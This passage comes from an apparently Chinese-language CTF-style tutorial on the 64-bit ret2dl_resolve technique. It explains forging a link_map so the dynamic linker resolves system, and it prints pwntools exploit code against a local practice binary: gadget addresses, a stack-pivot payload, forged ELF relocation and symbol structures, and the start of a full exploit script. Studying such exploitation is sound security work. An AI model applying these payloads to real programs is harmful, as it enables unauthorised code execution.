0**不成立，让函数进入下面的else语句，并且让 l-&gt;l_addr + sym-&gt;st_value指向system函数即可。</p><p>我们肯定不知道system的真实地址的，所以我们无法直接达到我们的目的，但是我们可以<strong>先将l-&gt;l_addr和sym-&gt;st_value其中 之一落在got表的某个已解析的函数上，另一个设置为system函数和这个函数 的偏移值</strong>。既然我们都伪造了link_map，那么显然l_addr是我们可以控制的，而sym根据我们上面的源码分析， 它的值最终也是从link_map中获得的。只要我们控制了link_map，l-&gt;l_addr和sym-&gt;st_value就是可控的。当我们知道了libc版本，就可以得到system的地址。</p><p>我们可以让sym-&gt;st_value落在某个已经解析过的got表上。那么sym的地址就是这个got表项的地址减去8，这时<strong>只要保证sym的地址上的函数也是已经解析过的此时sym-&gt;st_other一般为0x7f,如此就可以保证(sym-&gt;st_other)&amp;0x03 != 0</strong>，如果sym不是对应着另一个函数的got表，就需要确保（*(sym+5))&amp;0x03 != 0</p><p>剩下的就是保证l-&gt;l_addr是我们想要的值，但又没法泄露libc，这样我们就要控制符号表symtab以及reloc-&gt;r_info,所以我们得<strong>伪造 DT_SYMTAB, DT_JMPREL</strong>，我们得伪造strtab为可读地址，所以还得伪造<strong>DT_STRTAB</strong>，所以我们需要<strong>伪造link_map前0xf8个字节的数据</strong>，需要关注的分别是位于<strong>link_map+0的l_addr，位于link_map+0x68的 DT_STRTAB指针，位于link_map+0x70的DT_SYMTAB指针和位于link_map+0xF8的DT_JMPREL指针</strong>。此外，我们需要<strong>伪造Elf64_Sym结构体，Elf64_Rela结构体</strong>，由于DT_JMPREL指向的是<strong>Elf64_Dyn结构体</strong>，我们也需要 伪造一个这样的结构体。当然，我们得让reloc_offset为0.为了伪造的方便，我们可以选择让l-&gt;l_addr 为已解析函数内存地址和system的偏移，sym-&gt;st_value为已解析的函数地址的指针-8，即其got表项-8.</p><p>我们再看看link_map的结构体，该结构体定义在*/include/link.h*</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/* Structure describing a loaded shared object.  The `l_next&#x27; and `l_prev&#x27;</span></span><br><span class="line"><span class="comment">   members form a chain of all the shared objects loaded at startup.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   These data structures exist in space used by the run-time dynamic linker;</span></span><br><span class="line"><span class="comment">   modifying them may have disastrous results.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   This data structure might change in future, if necessary.  User-level</span></span><br><span class="line"><span class="comment">   programs must avoid defining objects of this type.  */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="comment">/* These first few members are part of the protocol with the debugger.</span></span><br><span class="line"><span class="comment">       This is the same format used in SVR4.  */</span></span><br><span class="line"></span><br><span class="line">    ElfW(Addr) l_addr;<span class="comment">/* Difference between the address in the ELF</span></span><br><span class="line"><span class="comment">   file and the addresses in memory.  */</span></span><br><span class="line">    <span class="keyword">char</span> *l_name;<span class="comment">/* Absolute file name object was found in.  */</span></span><br><span class="line">    ElfW(Dyn) *l_ld;<span class="comment">/* Dynamic section of the shared object.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_next</span>, *<span class="title">l_prev</span>;</span> <span class="comment">/* Chain of loaded objects.  */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* All following members are internal to the dynamic linker.</span></span><br><span class="line"><span class="comment">       They may change without notice.  */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* This is an element which is only ever different from a pointer to</span></span><br><span class="line"><span class="comment">       the very same copy of this type for ld.so when it is used in more</span></span><br><span class="line"><span class="comment">       than one namespace.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_real</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Number of the namespace this link map belongs to.  */</span></span><br><span class="line">    Lmid_t l_ns;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">libname_list</span> *<span class="title">l_libname</span>;</span></span><br><span class="line">    <span class="comment">/* Indexed pointers to dynamic section.</span></span><br><span class="line"><span class="comment">       [0,DT_NUM) are indexed by the processor-independent tags.</span></span><br><span class="line"><span class="comment">       [DT_NUM,DT_NUM+DT_THISPROCNUM) are indexed by the tag minus DT_LOPROC.</span></span><br><span class="line"><span class="comment">       [DT_NUM+DT_THISPROCNUM,DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM) are</span></span><br><span class="line"><span class="comment">       indexed by DT_VERSIONTAGIDX(tagvalue).</span></span><br><span class="line"><span class="comment">       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM,</span></span><br><span class="line"><span class="comment">DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM) are indexed by</span></span><br><span class="line"><span class="comment">       DT_EXTRATAGIDX(tagvalue).</span></span><br><span class="line"><span class="comment">       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM,</span></span><br><span class="line"><span class="comment">DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM) are</span></span><br><span class="line"><span class="comment">       indexed by DT_VALTAGIDX(tagvalue) and</span></span><br><span class="line"><span class="comment">       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM,</span></span><br><span class="line"><span class="comment">DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM+DT_ADDRNUM)</span></span><br><span class="line"><span class="comment">       are indexed by DT_ADDRTAGIDX(tagvalue), see &lt;elf.h&gt;.  */</span></span><br><span class="line"></span><br><span class="line">    ElfW(Dyn) *l_info[DT_NUM + DT_THISPROCNUM + DT_VERSIONTAGNUM</span><br><span class="line">      + DT_EXTRANUM + DT_VALNUM + DT_ADDRNUM];</span><br><span class="line">    <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Phdr)</span> *l_phdr</span>;<span class="comment">/* Pointer to program header table in core.  */</span></span><br><span class="line">    ElfW(Addr) l_entry;<span class="comment">/* Entry point location.  */</span></span><br><span class="line">    ElfW(Half) l_phnum;<span class="comment">/* Number of program header entries.  */</span></span><br><span class="line">    ElfW(Half) l_ldnum;<span class="comment">/* Number of dynamic segment entries.  */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Array of DT_NEEDED dependencies and their dependencies, in</span></span><br><span class="line"><span class="comment">       dependency order for symbol lookup (with and without</span></span><br><span class="line"><span class="comment">       duplicates).  There is no entry before the dependencies have</span></span><br><span class="line"><span class="comment">       been loaded.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_scope_elem</span> <span class="title">l_searchlist</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* We need a special searchlist to process objects marked with</span></span><br><span class="line"><span class="comment">       DT_SYMBOLIC.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_scope_elem</span> <span class="title">l_symbolic_searchlist</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Dependent object that first caused this object to be loaded.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_loader</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Array with version names.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_found_version</span> *<span class="title">l_versions</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_nversions;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Symbol hash table.  */</span></span><br><span class="line">    Elf_Symndx l_nbuckets;</span><br><span class="line">    Elf32_Word l_gnu_bitmask_idxbits;</span><br><span class="line">    Elf32_Word l_gnu_shift;</span><br><span class="line">    <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Addr)</span> *l_gnu_bitmask</span>;</span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      <span class="keyword">const</span> Elf32_Word *l_gnu_buckets;</span><br><span class="line">      <span class="keyword">const</span> Elf_Symndx *l_chain;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      <span class="keyword">const</span> Elf32_Word *l_gnu_chain_zero;</span><br><span class="line">      <span class="keyword">const</span> Elf_Symndx *l_buckets;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_direct_opencount; <span class="comment">/* Reference count for dlopen/dlclose.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">enum</span>/* <span class="title">Where</span> <span class="title">this</span> <span class="title">object</span> <span class="title">came</span> <span class="title">from</span>.  */</span></span><br><span class="line"><span class="class">      &#123;</span></span><br><span class="line">lt_executable,<span class="comment">/* The main executable program.  */</span></span><br><span class="line">lt_library,<span class="comment">/* Library needed by main executable.  */</span></span><br><span class="line">lt_loaded<span class="comment">/* Extra run-time loaded shared object.  */</span></span><br><span class="line">      &#125; l_type:<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_relocated:<span class="number">1</span>;<span class="comment">/* Nonzero if object&#x27;s relocations done.  */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_init_called:<span class="number">1</span>; <span class="comment">/* Nonzero if DT_INIT function called.  */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_global:<span class="number">1</span>;<span class="comment">/* Nonzero if object in _dl_global_scope.  */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_reserved:<span class="number">2</span>;<span class="comment">/* Reserved for internal use.  */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_phdr_allocated:<span class="number">1</span>; <span class="comment">/* Nonzero if the data structure pointed</span></span><br><span class="line"><span class="comment">to by `l_phdr&#x27; is allocated.  */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_soname_added:<span class="number">1</span>; <span class="comment">/* Nonzero if the SONAME is for sure in</span></span><br><span class="line"><span class="comment">      the l_libname list.  */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_faked:<span class="number">1</span>;<span class="comment">/* Nonzero if this is a faked descriptor</span></span><br><span class="line"><span class="comment">   without associated file.  */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_need_tls_init:<span class="number">1</span>; <span class="comment">/* Nonzero if GL(dl_init_static_tls)</span></span><br><span class="line"><span class="comment">       should be called on this link map</span></span><br><span class="line"><span class="comment">       when relocation finishes.  */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_auditing:<span class="number">1</span>;<span class="comment">/* Nonzero if the DSO is used in auditing.  */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_audit_any_plt:<span class="number">1</span>; <span class="comment">/* Nonzero if at least one audit module</span></span><br><span class="line"><span class="comment">       is interested in the PLT interception.*/</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_removed:<span class="number">1</span>;<span class="comment">/* Nozero if the object cannot be used anymore</span></span><br><span class="line"><span class="comment">   since it is removed.  */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_contiguous:<span class="number">1</span>; <span class="comment">/* Nonzero if inter-segment holes are</span></span><br><span class="line"><span class="comment">    mprotected or if no holes are present at</span></span><br><span class="line"><span class="comment">    all.  */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_symbolic_in_local_scope:<span class="number">1</span>; <span class="comment">/* Nonzero if l_local_scope</span></span><br><span class="line"><span class="comment"> during LD_TRACE_PRELINKING=1</span></span><br><span class="line"><span class="comment"> contains any DT_SYMBOLIC</span></span><br><span class="line"><span class="comment"> libraries.  */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_free_initfini:<span class="number">1</span>; <span class="comment">/* Nonzero if l_initfini can be</span></span><br><span class="line"><span class="comment">       freed, ie. not allocated with</span></span><br><span class="line"><span class="comment">       the dummy malloc in ld.so.  */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Collected information about own RPATH directories.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_search_path_struct</span> <span class="title">l_rpath_dirs</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Collected results of relocation while profiling.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">reloc_result</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      DL_FIXUP_VALUE_TYPE addr;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">bound</span>;</span></span><br><span class="line">      <span class="keyword">unsigned</span> <span class="keyword">int</span> boundndx;</span><br><span class="line">      <span class="keyword">uint32_t</span> enterexit;</span><br><span class="line">      <span class="keyword">unsigned</span> <span class="keyword">int</span> flags;</span><br><span class="line">    &#125; *l_reloc_result;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Pointer to the version information if available.  */</span></span><br><span class="line">    ElfW(Versym) *l_versyms;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* String specifying the path where this object was found.  */</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *l_origin;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Start and finish of memory map for this object.  l_map_start</span></span><br><span class="line"><span class="comment">       need not be the same as l_addr.  */</span></span><br><span class="line">    ElfW(Addr) l_map_start, l_map_end;</span><br><span class="line">    <span class="comment">/* End of the executable part of the mapping.  */</span></span><br><span class="line">    ElfW(Addr) l_text_end;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Default array for &#x27;l_scope&#x27;.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_scope_elem</span> *<span class="title">l_scope_mem</span>[4];</span></span><br><span class="line">    <span class="comment">/* Size of array allocated for &#x27;l_scope&#x27;.  */</span></span><br><span class="line">    <span class="keyword">size_t</span> l_scope_max;</span><br><span class="line">    <span class="comment">/* This is an array defining the lookup scope for this link map.</span></span><br><span class="line"><span class="comment">       There are initially at most three different scope lists.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_scope_elem</span> **<span class="title">l_scope</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* A similar array, this time only with the local scope.  This is</span></span><br><span class="line"><span class="comment">       used occasionally.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_scope_elem</span> *<span class="title">l_local_scope</span>[2];</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* This information is kept to check for sure whether a shared</span></span><br><span class="line"><span class="comment">       object is the same as one already loaded.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_file_id</span> <span class="title">l_file_id</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Collected information about own RUNPATH directories.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_search_path_struct</span> <span class="title">l_runpath_dirs</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* List of object in order of the init and fini calls.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> **<span class="title">l_initfini</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* List of the dependencies introduced through symbol binding.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map_reldeps</span></span></span><br><span class="line"><span class="class">      &#123;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> act;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">list</span>[];</span></span><br><span class="line">      &#125; *l_reldeps;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_reldepsmax;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Nonzero if the DSO is used.  */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_used;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Various flag words.  */</span></span><br><span class="line">    ElfW(Word) l_feature_1;</span><br><span class="line">    ElfW(Word) l_flags_1;</span><br><span class="line">    ElfW(Word) l_flags;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Temporarily used in `dl_close&#x27;.  */</span></span><br><span class="line">    <span class="keyword">int</span> l_idx;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map_machine</span> <span class="title">l_mach</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *sym</span>;</span><br><span class="line">      <span class="keyword">int</span> type_class;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">value</span>;</span></span><br><span class="line">      <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *ret</span>;</span><br><span class="line">    &#125; l_lookup_cache;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Thread-local storage related info.  */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Start of the initialization image.  */</span></span><br><span class="line">    <span class="keyword">void</span> *l_tls_initimage;</span><br><span class="line">    <span class="comment">/* Size of the initialization image.  */</span></span><br><span class="line">    <span class="keyword">size_t</span> l_tls_initimage_size;</span><br><span class="line">    <span class="comment">/* Size of the TLS block.  */</span></span><br><span class="line">    <span class="keyword">size_t</span> l_tls_blocksize;</span><br><span class="line">    <span class="comment">/* Alignment requirement of the TLS block.  */</span></span><br><span class="line">    <span class="keyword">size_t</span> l_tls_align;</span><br><span class="line">    <span class="comment">/* Offset of first byte module alignment.  */</span></span><br><span class="line">    <span class="keyword">size_t</span> l_tls_firstbyte_offset;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> NO_TLS_OFFSET</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> NO_TLS_OFFSET0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> FORCED_DYNAMIC_TLS_OFFSET</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">if</span> NO_TLS_OFFSET == 0</span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> FORCED_DYNAMIC_TLS_OFFSET -1</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">elif</span> NO_TLS_OFFSET == -1</span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> FORCED_DYNAMIC_TLS_OFFSET -2</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">error</span> <span class="meta-string">&quot;FORCED_DYNAMIC_TLS_OFFSET is not defined&quot;</span></span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="comment">/* For objects present at startup time: offset in the static TLS block.  */</span></span><br><span class="line">    <span class="keyword">ptrdiff_t</span> l_tls_offset;</span><br><span class="line">    <span class="comment">/* Index of the module in the dtv array.  */</span></span><br><span class="line">    <span class="keyword">size_t</span> l_tls_modid;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Number of thread_local objects constructed by this DSO.  This is</span></span><br><span class="line"><span class="comment">       atomically accessed and modified and is not always protected by the load</span></span><br><span class="line"><span class="comment">       lock.  See also: CONCURRENCY NOTES in cxa_thread_atexit_impl.c.  */</span></span><br><span class="line">    <span class="keyword">size_t</span> l_tls_dtor_count;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Information used to change permission after the relocations are</span></span><br><span class="line"><span class="comment">       done.  */</span></span><br><span class="line">    ElfW(Addr) l_relro_addr;</span><br><span class="line">    <span class="keyword">size_t</span> l_relro_size;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> l_serial;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Audit information.  This array apparent must be the last in the</span></span><br><span class="line"><span class="comment">       structure.  Never add something after it.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">auditstate</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      <span class="keyword">uintptr_t</span> cookie;</span><br><span class="line">      <span class="keyword">unsigned</span> <span class="keyword">int</span> bindflags;</span><br><span class="line">    &#125; l_audit[<span class="number">0</span>];</span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure><p>我们会发现上面的结构体非常的复杂，很难找到我们<strong>STRTAB/SYMTAB/JMPREL</strong>这3个表存放的位置，但是通过动态调试我们可以得知这三个地址存放分别位于<strong>link_map+0x68/0x70/0xf8</strong>处，如此一来我们只需要将这三个表伪造出来，然后在相应位置存放它们的地址即可。</p><p>我们先确定一下sym-&gt;st_value应该落在哪个函数上，我们先查看write函数got表项前一个表项的值</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210826203620182.png" alt="查看got表项"></p><p>可以确定是可以使用write作为sym-&gt;st_value。</p><p>确认我们需要用到的一些位置</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">offset=<span class="number">120</span></span><br><span class="line"></span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_got=elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">jmp_dl_fixup=<span class="number">0x401026</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bss_addr=elf.get_section_by_name(<span class="string">&#x27;.bss&#x27;</span>).header.sh_addr</span><br><span class="line">fake_stack=bss_addr+<span class="number">0x800</span></span><br><span class="line">fake_link_map_addr=fake_stack+<span class="number">0x100</span></span><br><span class="line"></span><br><span class="line">gadget1=<span class="number">0x40121A</span>    <span class="comment">#pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; retn</span></span><br><span class="line">gadget2=<span class="number">0x401200</span>    <span class="comment">#mov rdx, r14; mov rsi, r13; mov edi, r12d; call qword ptr [r15+rbx*8]</span></span><br><span class="line">pop_rdi_ret=<span class="number">0x0000000000401223</span></span><br><span class="line">pop_rsi_r15_ret=<span class="number">0x0000000000401221</span></span><br><span class="line">pop_rbp_ret=<span class="number">0x40113d</span></span><br><span class="line">ret=<span class="number">0x000000000040101a</span></span><br><span class="line">leave_ret=<span class="number">0x40118f</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们先将栈迁移到.bss段准备并在栈里读入我们的payload</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload =<span class="string">&#x27;a&#x27;</span>*offset</span><br><span class="line">payload+=p64(gadget1)</span><br><span class="line">payload+=p64(<span class="number">0</span>)<span class="comment">#rbx 为了后面跳转做偏移</span></span><br><span class="line">payload+=p64(<span class="number">0x1</span>)<span class="comment">#rbp,不可为0</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)<span class="comment">#r12 -&gt; rdi</span></span><br><span class="line">payload+=p64(fake_stack)<span class="comment">#r13 -&gt; rsi</span></span><br><span class="line">payload+=p64(<span class="number">0x500</span>)<span class="comment">#r14-&gt;rdx</span></span><br><span class="line">payload+=p64(read_got)<span class="comment">#r15</span></span><br><span class="line">payload+=p64(gadget2)<span class="comment">#ret</span></span><br><span class="line">payload+=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x38</span><span class="comment">#返回后对栈会进行pop</span></span><br><span class="line"></span><br><span class="line">payload += p64(pop_rbp_ret)<span class="comment">#返回到pop rbp; retn，劫持栈。</span></span><br><span class="line">payload += p64(fake_stack)</span><br><span class="line">payload += p64(leave_ret)</span><br><span class="line"></span><br><span class="line">sla(io,<span class="string">&quot;Input:\n&quot;</span>,payload)</span><br></pre></td></tr></table></figure><p>接下来就是重头戏伪造我们的link_map，在伪造link_map之前我们先把需要用到的三个表先伪造好</p><p>伪造.dynamic里的重定位表项</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fake_relplt_Elf64_Dyn =p64(<span class="number">0</span>)                                   <span class="comment">#d_tag  标签，用不到可以随意设置</span></span><br><span class="line">fake_relplt_Elf64_Dyn+=p64(fake_Elf64_Rela_addr)                <span class="comment">#d_ptr  指向虚假的Elf64_Rela结构体的指针。因为reloc_offset被简化为0，所以该地址就是我们伪造的地址</span></span><br></pre></td></tr></table></figure><p>伪造重定位表</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fake_Elf64_Rela =flat(fake_link_map_addr-system_write_offset)   <span class="comment">#r_offset   rel_addr = l-&gt;addr+r_offset,这里让其写入一个可写地址即可，这里选择fake_link_map，因为我们的l-&gt;addr为system_write_offset那么r_offset=fake_link_map_addr-system_write_offset</span></span><br><span class="line">fake_Elf64_Rela+=p64(<span class="number">7</span>)                                         <span class="comment">#r_info     index设置为0，最后一字节必须为7</span></span><br><span class="line">fake_Elf64_Rela+=p64(<span class="number">0</span>)                                         <span class="comment">#r_addend   任意设置即可</span></span><br></pre></td></tr></table></figure><p>伪造符号表</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fake_Elf64_Sym =p32(<span class="number">0</span>)                                          <span class="comment">#st_name任意设置</span></span><br><span class="line">fake_Elf64_Sym+=p32(<span class="number">0xffffffff</span>)                                 <span class="comment">#保证st_info, st_other, st_shndx st_other非零r</span></span><br><span class="line">fake_Elf64_Sym+=p64(write_got-<span class="number">8</span>)                                <span class="comment">#st_value   已经解析的函数got地址减去8</span></span><br><span class="line">fake_Elf64_Sym+=p64(<span class="number">0</span>)            <span class="comment">#st_size随意设置</span></span><br></pre></td></tr></table></figure><p>接下来就该伪造link_map本身了，我们会发现伪造link_map中有好多地方是空的，我们不妨利用起来，将什么三个表项也放入link_map结构中,顺便把后面要用到的’/bin/sh\x00’也写入。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fake_link_map =flat(system_write_offset)                        <span class="comment">#l_addr</span></span><br><span class="line">fake_link_map+=fake_relplt_Elf64_Dyn</span><br><span class="line">fake_link_map+=fake_Elf64_Rela</span><br><span class="line">fake_link_map+=fake_Elf64_Sym</span><br><span class="line">fake_link_map+=<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x20</span></span><br><span class="line">fake_link_map+=p64(fake_link_map_addr)                          <span class="comment">#DT_STRTAB  任意可读位置即可</span></span><br><span class="line">fake_link_map+=p64(fake_Elf64_Sym_addr)                         <span class="comment">#DT_SYMTAB  指向fake_Elf64_Sym</span></span><br><span class="line">fake_link_map+=<span class="string">&#x27;/bin/sh\x00&#x27;</span>                                    <span class="comment">#binsh</span></span><br><span class="line">fake_link_map+=<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x78</span></span><br><span class="line">fake_link_map+=p64(fake_relplt_Elf64_Dyn_addr)                  <span class="comment">#DT_JMPREL  指向fake_relplt_Elf64_Dyn</span></span><br></pre></td></tr></table></figure><p>接下来只需将binsh的地址放入寄存器中再调用jmp_dl_fixup到我们构造好的link_map即可</p><p>完整exp</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&#x27;./level3_partialrelro_64&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./level3_partialrelro_64&#x27;</span>)</span><br><span class="line">libc= ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ru = <span class="keyword">lambda</span> p, x ,drop=<span class="literal">False</span>: p.recvuntil(x,drop)</span><br><span class="line">sn = <span class="keyword">lambda</span> p, x            : p.send(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> p               : p.recvline()</span><br><span class="line">sl = <span class="keyword">lambda</span> p, x            : p.sendline(x)</span><br><span class="line">rv = <span class="keyword">lambda</span> p, x=<span class="number">1024</span>       : p.recv(numb = x)</span><br><span class="line">sa = <span class="keyword">lambda</span> p, a, b         : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> p, a, b        : p.sendlineafter(a,b)</span><br><span class="line">rr = <span class="keyword">lambda</span> p, t            : p.recvrepeat(t)</span><br><span class="line">rd = <span class="keyword">lambda</span> p, x            : p.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">offset=<span class="number">120</span></span><br><span class="line"></span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_got=elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">jmp_dl_fixup=<span class="number">0x401026</span></span><br><span class="line"></span><br><span class="line"></span><br><span 